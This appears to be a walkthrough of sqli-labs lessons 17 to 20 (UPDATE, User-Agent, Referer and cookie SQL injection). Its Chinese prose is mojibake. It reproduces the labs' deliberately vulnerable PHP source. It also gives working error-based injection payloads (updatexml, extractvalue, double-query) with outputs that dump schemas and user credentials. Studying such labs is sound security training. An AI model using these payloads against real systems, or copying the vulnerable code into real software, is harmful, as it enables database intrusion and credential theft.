    <content type="text"><![CDATA[Less-17 POST-Updata Query-Error Based-StringåŸºäºŽé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢postå­—ç¬¦æ³¨å…¥æµ‹è¯•é¡µé¢æ˜¾ç¤º PASSWORD RESET é‡ç½®å¯†ç  uname=test&amp;passwd=test2è¿”å›žé¡µé¢æ˜¾ç¤ºé‡ç½®é”™è¯¯ uname=admin&amp;passwd=test2è¿”å›žé¡µé¢æ˜¾ç¤ºé‡ç½®å¯†ç æˆåŠŸ åº”è¯¥æ˜¯ç”¨æˆ·åæ­£ç¡®å³å¯é‡ç½®å¯†ç  é¡µé¢æºä»£ç  &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { //making sure uname is not injectable $uname=check_input($_POST[&apos;uname&apos;]); $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;); fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); //echo $row; if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; $row1 = $row[&apos;username&apos;]; //echo &apos;Your Login name:&apos;. $row1; $update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;&apos;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; æºä»£ç åˆ†æžå®šä¹‰äº†å¯¹è¾“å…¥çš„ç”¨æˆ·åæ£€æŸ¥çš„å‡½æ•°ï¼Œè¦æ±‚ä¸èƒ½ä¸ºç©ºï¼Œé•¿åº¦ä¸º15ï¼Œè¶…è¿‡åˆ™æˆªå–15ä½ï¼›è‹¥å¼€å¯äº†é­”æœ¯æ–¹æ³•ï¼Œåˆ™åæ–œçº¿å°†è¢«åŽ»é™¤ï¼Œä½†æ˜¯ä¸¤ä¸ªåæ–œçº¿å°†ä¼šè¢«æ›¿æ¢æˆä¸€ä¸ªï¼›çº¯æ•°å­—æ£€æµ‹ï¼Œè‹¥ä¸ºå­—ç¬¦åˆ™ç”¨mysql_real_escape_stringå¯¹å…¶è¿›è¡Œè½¬ä¹‰ï¼Œçº¯æ•°å­—åˆ™è½¬æ¢ä½intåž‹è¿”å›žã€‚è¯¥å‡½æ•°åªå¯¹ç”¨æˆ·åè¿›è¡Œäº†æ£€éªŒï¼Œè€Œsqlè¯­å¥åˆ™åªéªŒè¯äº†æ˜¯å¦å­˜åœ¨è¯¥ç”¨æˆ·ï¼Œæ²¡æœ‰éªŒè¯å¯¹åº”çš„å¯†ç  SELECT username, password FROM users WHERE username= $uname LIMIT 0,1 ä¿®æ”¹æˆåŠŸåˆ™è¿”å›žä¸€å¼ åŒ…å«successçš„å›¾ç‰‡ï¼Œå¤±è´¥åˆ™è¿”å›žå¤±è´¥çš„å›¾ç‰‡ã€‚ payloadè¿™é‡Œå‚è€ƒç½‘ä¸Šæœ‰ä¸‰ç§æ–¹å¼å¯¹updateã€insertã€deleteè¿›è¡Œsqlæ³¨å…¥ 1ã€ å­æŸ¥è¯¢æ³¨å…¥å­æŸ¥è¯¢æ³¨å…¥å³ä¸ºä¹‹å‰è¯´åˆ°çš„åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆå…·ä½“å¯ä»¥å‚è€ƒLess-5ï¼‰ uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select concat(0x7e,0x27,database(),0x27,0x7e)),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos; %23 è¿”å›ž Duplicate entry &apos;~&apos;security&apos;~0&apos; for key &apos;group_key&apos; èŽ·å–è¡¨ uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos; %23 å­—æ®µå uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos;%23 èŽ·å–ç”¨æˆ·ä¿¡æ¯ uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select concat(0x27,id,0x7e,username,0x7e,password,0x27) from users limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos;%23 è¿”å›ž Duplicate entry &apos;&apos;1~Dumb~Dumb&apos;1&apos; for key &apos;group_key&apos; 2ã€é€šè¿‡name_const():name_connsta(name,value):è¿”å›žç»™å®šçš„å€¼ã€‚ç”¨äºŽç”Ÿæˆç»“æžœé›†åˆ—æ—¶ï¼ŒNAME_CONSTï¼ˆï¼‰ä¼šä½¿è¯¥åˆ—å…·æœ‰ç»™å®šçš„åç§°ã€‚å‚æ•°åº”è¯¥æ˜¯å¸¸é‡ã€‚é€‚ç”¨äºŽä½Žç‰ˆæœ¬ã€‚ uname=admin&amp;passwd=1&apos; or (select * from (select(name_const(database(),1)),name_const(database(),1))a) where username=&apos;admin&apos;%23 æŠ¥é”™ Incorrect arguments to NAME_CONST æ•°æ®åº“ç‰ˆæœ¬å¤ªé«˜äº† å›ºå®šæ ¼å¼ï¼š ... or (select * from(select name_const((select ...),1),name_const((select...),1))a) ... å¯¹äºŽupdate,insert,deleteéƒ½æœ‰ä¸€ä¸ªå›ºå®šç»“æž„ï¼šâ€¦ or (select * from(select name_const((select â€¦),1),name_const((selectâ€¦),1))a) â€¦ 3ã€é€šè¿‡updatexml()payload: updatexml(1,concat(0x7e,(version())),0) updatexml(xml_target,xpath_expr,new_xml)å‡½æ•°ï¼š ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ åœ¨è¿™é‡Œåªè¦æ”¹å˜ç¬¬äºŒä¸ªå‚æ•°ä½¿å…¶æŠ¥é”™å³å¯ï¼Œç”±äºŽå¯¹ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œäº†è¿‡æ»¤æ£€æŸ¥ï¼Œè¿™é‡Œå¯¹passwdå­—æ®µè¿›è¡Œæ³¨å…¥æ”¹å˜XML_documentä¸­ç¬¦åˆXPATH_stringçš„å€¼ payloaduname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,version(),0x2b),1) %23 è¿”å›ž XPATH syntax error: &apos;+5.5.53+&apos; uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,database(),0x2b),1) %23 è¿”å›žï¼šXPATH syntax error: &apos;+security+&apos; uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select group_concat(schema_name) from information_schema.schemata),0x2b),1) %23 è¿”å›žï¼šXPATH syntax error: &apos;+information_schema,challenges,m&apos;åœ¨è¿™é‡Œåªè¿”å›žäº†éƒ¨åˆ†ä¿¡æ¯ èŽ·å–æ•°æ®åº“å uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1) %23 è¿”å›žï¼šXPATH syntax error: &apos;+information_schema+&apos; èŽ·å–è¡¨å uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),1) %23 è¿”å›žï¼šXPATH syntax error: &apos;+emails+&apos; èŽ·å–åˆ—å uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x2b),1) %23 XPATH syntax error: &apos;+id+&apos; èŽ·å–ç”¨æˆ·ä¿¡æ¯ï¼š 1ã€åŒæ³¨å…¥æŸ¥è¯¢ uname=admin&amp;passwd=&apos; or updatexml(1,concat(0x7e,(select * from(select concat_ws(char(32,44,32),id,username,password) from users limit 7,1)a),0x7e),0)# è¿”å›žXPATH syntax error: &apos;~8 , admin , admin~&apos; è¿™é‡Œè¦æ³¨æ„å¯èƒ½ç”±äºŽä¹‹å‰çš„æ›´æ–°æ“ä½œæŠŠæ•°æ®åº“é‡Œä¸€äº›å¯†ç æ¸…ç©ºäº† 4ã€extractvalue()EXTRACTVALUE (XML_document, XPath_string); ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²). ä½œç”¨ï¼šä»Žç›®æ ‡XMLä¸­è¿”å›žåŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²é€‚ç”¨ä¸Župdatexml()ç›¸ä¼¼ payloaduname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,version(),0x2b)) %23 è¿”å›žï¼šXPATH syntax error: &apos;+5.5.53+&apos; uname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,database(),0x2b)) %23 è¿”å›žï¼šXPATH syntax error: &apos;+security+&apos; èŽ·å–æ•°æ®åº“å uname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1) ,0x2b)) %23 è¿”å›žï¼šXPATH syntax error: &apos;+information_schema+&apos; å…¶ä»–ä¸Župdatexml()ç›¸ä¼¼ Less-18 POST-Header Injection-Uagent field-Error basedåŸºäºŽé”™è¯¯çš„å¯¹å¤´éƒ¨UserAgentçš„postæ³¨å…¥æµ‹è¯•æ‰“å¼€é¡µé¢æ˜¾ç¤ºIPåœ°å€ Your IP ADDRESS is: 192.168.83.140 å¯¹postå‚æ•°æµ‹è¯•æ²¡æœ‰ä»»ä½•ååº” æŸ¥çœ‹æºä»£ç &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,20); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } $uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; $IP = $_SERVER[&apos;REMOTE_ADDR&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your IP ADDRESS is: &apos; .$IP; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your User Agent is: &apos; .$uagent; // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname = check_input($_POST[&apos;uname&apos;]); $passwd = check_input($_POST[&apos;passwd&apos;]); /* echo &apos;Your Your User name:&apos;. $uname; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos;. $passwd; echo &quot;&lt;br&gt;&quot;; echo &apos;Your User Agent String:&apos;. $uagent; echo &quot;&lt;br&gt;&quot;; echo &apos;Your User Agent String:&apos;. $IP; */ //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Agent:&apos;.$uname.&quot;\n&quot;); fclose($fp); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; mysql_query($insert); //echo &apos;Your IP ADDRESS is: &apos; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;; echo &apos;Your User Agent is: &apos; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; ä¸€å¼€å§‹å°±ä¼šå›žæ˜¾ç™»å…¥çš„IPåœ°å€ï¼Œç„¶åŽå¯¹usernameçš„ä¸¤ä¸ªå‚æ•°è¿›è¡Œäº†æ£€æŸ¥è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œæµ‹è¯•æ—¶æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œsqlè¯­å¥éªŒè¯äº†ç™»å…¥çš„è´¦å·å¯†ç æ˜¯å¦ç›¸åŒï¼Œåªæœ‰è´¦å·å¯†ç æ­£ç¡®æ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥çš„æ“ä½œï¼Œå¯ä»¥è¿™é‡Œæ˜¯åœ¨å·²ç»æ³¨å†Œäº†è´¦å·çš„å‰æä¸‹è¿›è¡Œæµ‹è¯•ï¼›æ­£ç¡®ç™»å…¥åŽåšäº†ä¸€ä¸ªå‘security.uagentsè¡¨æ’å…¥useragentï¼Œipåœ°å€ï¼Œç”¨æˆ·åçš„æ“ä½œï¼Œå†å›žæ˜¾useragentï¼Œå¦‚æžœç™»å…¥å¤±è´¥ä¼šè¿›è¡ŒæŠ¥é”™ã€‚ $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot; æµ‹è¯•uname=admin&amp;passwd=admin è¿”å›ž Your IP ADDRESS is: 192.168.83.140 Your User Agent is: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 ç”±äºŽå¯¹usernameå’Œpasswordè¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™é‡Œè€ƒè™‘å¯¹æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æ“ä½œçš„uagentså’Œip_addrè¿›è¡Œæ³¨å…¥æµ‹è¯• ä½¿ç”¨burpsuitçš„repeaterè¿›è¡Œæµ‹è¯•User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos; è¿”å›ž near &apos;192.168.83.140&apos;, &apos;admin&apos;)&apos; at line 1 åˆ†æžï¼šç”±å•å¼•å·åŒ…è£¹ï¼Œæœ€åŽåˆæ‹¬å·é—­åˆ æž„é€ payloadUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,1,2)# è¿”å›žæ­£å¸¸ Your User Agent is: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,1,2)# å°è¯•åœ¨åŽé¢æ·»åŠ æŸ¥è¯¢è¯­å¥ User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,(select database()),2)# å¹¶æ²¡æœ‰è¿”å›žæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ ä½¿ç”¨updatexml()è¿›è¡Œæ³¨å…¥ç‰ˆæœ¬å· &apos;or updatexml(1,concat(0x2b,version(),0x2b),1))# è¿”å›žï¼šXPATH syntax error: &apos;+5.5.53+&apos; å½“å‰æ•°æ®åº“å &apos;or updatexml(1,concat(0x2b,database(),0x2b),1))# XPATH syntax error: &apos;+security+&apos; æ‰€æœ‰æ•°æ®åº“å &apos;or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1))# XPATH syntax error: &apos;+information_schema+&apos; è¡¨å &apos;or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),1))# XPATH syntax error: &apos;+emails+&apos; åˆ—å &apos;or updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x2b),1))# XPATH syntax error: &apos;+id+&apos; XPATH syntax error: &apos;+username+&apos; XPATH syntax error: &apos;+password+&apos; èŽ·å–è´¦å·ä¿¡æ¯ &apos;or updatexml(1,concat(0x2b,(select group_concat(username,password) from security.users limit 0,1),0x2b),1))# XPATH syntax error: &apos;+DumbDumb,AngelinaI-kill-you,Dum&apos; åœ¨è¿™é‡Œä½¿ç”¨extractvalue()åŒæ ·å¯ä»¥ï¼Œæ³¨æ„æ˜¯ä¸¤ä¸ªå‚æ•° &apos;or extractvalue(1,concat(0x2b,(select group_concat(username,password) from security.users limit 0,1),0x2b)))# XPATH syntax error: &apos;+DumbDumb,AngelinaI-kill-you,Dum&apos; Less-19 POST-Header Injection-Referer field-Error basedåŸºäºŽé”™è¯¯çš„å¯¹å¤´éƒ¨Refererçš„postæ³¨å…¥åˆ†æžè¿™é‡Œä¸ŽLess-18ç›¸ä¼¼ï¼Œåªä¸è¿‡æ³¨å…¥çš„åœ°æ–¹å˜æˆäº†refererï¼Œä½¿ç”¨å·²çŸ¥çš„è´¦å·å¯†ç ç™»å…¥ uname=admin&amp;passwd=admin Your IP ADDRESS is: 192.168.83.140 Your Referer is:burpsuitæŠ“åŒ…å¦‚ä¸‹ POST /sqli-labs/Less-19/ HTTP/1.1 Host: 192.168.83.141 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Forwarded-For: 123.232.23.245 CLTENT-IP: 123.232.23.245 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 24 uname=admin&amp;passwd=admin æˆ‘ä»¬çœ‹åˆ°ä¸Šè¿°è¯·æ±‚ä¸­å¹¶æ²¡æœ‰refererè¿™é‡Œä½¿ç”¨hackbaræˆ–burpsuitç›´æŽ¥åœ¨è¯·æ±‚ä¸­æ·»åŠ  Referer: https://localhost/sql-labs/Less-19&apos;or updatexml(1,concat(0x2b,version(),0x2b),1))# XPATH syntax error: &apos;+5.5.53+&apos; å…¶ä»–åŒä¸Š åœ¨ä½¿ç”¨hackbaræµ‹è¯•æ—¶é‡åˆ°äº†ä¸€äº›éº»çƒ¦ï¼Œæ³¨é‡Šç¬¦å·# å’Œâ€“ä¸€ç›´ä¸èµ·ä½œç”¨ï¼ŒæŠ“åŒ…åŽå‘çŽ°æ²¡æœ‰äº†æ³¨é‡Šç¬¦#è™½ç„¶æœ‰â€“ï¼Œæ‹…ä¸èµ·ä½œç”¨ï¼Œä½¿ç”¨%23ï¼Œè¿™é‡Œçš„ç¼–ç é—®é¢˜ Less-20 POST-Cookie injection-Uagent field-error basedåŸºäºŽé”™è¯¯çš„å¯¹å¤´éƒ¨cookieçš„postæ³¨å…¥æµ‹è¯•uname=admin&amp;passwd=admin è¿”å›ž YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 YOUR IP ADDRESS IS : 192.168.83.140 DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE YOUR COOKIE : uname = admin and expires: Thu 26 Apr 2018 - 02:45:27 Your Login name:admin Your Password:admin Your ID:8 è¿™é‡Œå°†ä¸€äº›å…³é”®ä¿¡æ¯éƒ½æ˜¾ç¤ºäº†ï¼Œæ³¨æ„ä¸‹é¢æœ‰ä¸ªæŒ‰é’® Delete You cookie! ,ç‚¹å‡»åŽç›´æŽ¥è·³è½¬åˆ°ç™»å…¥é¡µé¢ï¼Œå¯ä»¥æŽ¨æµ‹åº”è¯¥æœ‰ä¸€ä¸ªå¯¹cookieè¿›è¡Œæ“ä½œçš„è¿‡ç¨‹ burpsuitæŠ“å–åˆ é™¤cookieæ“ä½œçš„æ•°æ®åŒ…POST /sqli-labs/Less-20/index.php HTTP/1.1 Host: 192.168.83.141 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.83.141/sqli-labs/Less-20/index.php Cookie: uname=admin X-Forwarded-For: 123.232.23.245 CLTENT-IP: 123.232.23.245 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 28 submit=Delete+Your+Cookie%21 æºä»£ç &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); if(!isset($_COOKIE[&apos;uname&apos;])) { //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); echo &quot;&lt;div style=&apos; margin-top:20px;color:#FFF; font-size:24px; text-align:center&apos;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&apos;#FF0000&apos;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div align=&apos;center&apos; style=&apos;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&apos;&gt;&quot;; echo &quot;&lt;div style=&apos;padding-top:10px; font-size:15px;&apos;&gt;&quot;; echo &quot;&lt;!--Form to post the contents --&gt;&quot;; echo &apos;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&apos;; echo &apos; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;; echo &apos; &lt;input type=&quot;text&quot; name=&quot;uname&quot; value=&quot;&quot;/&gt; &lt;/div&gt;&apos;; echo &apos; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&apos;; echo &apos; &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&apos;; echo &apos; &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;; echo &apos;&lt;/form&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; echo &apos;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&apos;; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; echo &apos;&lt;/center&gt;&apos;; function check_input($value) { if(!empty($value)) { $value = substr($value,0,20); // truncation (see comments) } if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled { $value = stripslashes($value); } if (!ctype_digit($value)) // Quote if not a number { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname = check_input($_POST[&apos;uname&apos;]); $passwd = check_input($_POST[&apos;passwd&apos;]); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); $cookee = $row1[&apos;username&apos;]; if($row1) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; setcookie(&apos;uname&apos;, $cookee, time()+3600); header (&apos;Location: index.php&apos;); echo &quot;I LOVE YOU COOKIES&quot;; echo &quot;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;; //echo &apos;Your Cookie is: &apos; .$cookee; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } echo &quot;&lt;/font&gt;&quot;; echo &apos;&lt;/font&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; } else { if(!isset($_POST[&apos;submit&apos;])) { $cookee = $_COOKIE[&apos;uname&apos;]; $format = &apos;D d M Y - H:i:s&apos;; $timestamp = time() + 3600; echo &quot;&lt;center&gt;&quot;; echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &apos;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&apos;; echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&apos;HTTP_USER_AGENT&apos;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&apos;; echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&apos;; echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;orange&quot; font size = 5 &gt;&apos;; echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp); echo &quot;&lt;br&gt;&lt;/font&gt;&quot;; $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) { die(&apos;Issue with your mysql: &apos; . mysql_error()); } $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&apos;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&apos;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;Your ID:&apos; .$row[&apos;id&apos;]; } else { echo &quot;&lt;center&gt;&quot;; echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; //echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; 